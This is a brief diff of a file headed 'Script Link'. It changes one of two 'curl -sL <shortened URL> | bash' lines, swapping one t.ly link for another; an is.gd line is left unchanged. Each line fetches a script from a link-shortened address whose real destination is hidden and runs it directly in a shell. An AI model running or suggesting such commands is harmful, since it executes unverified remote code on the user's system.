@@ -18,7 +18,7 @@ Script Link
 ////////////////////////////////////////////////////////////////////////
 curl -sL https://is.gd/9NaJtt | bash
 
-curl -sL t.ly/fhiJ | bash
+curl -sL t.ly/gEPD | bash
 
 
 
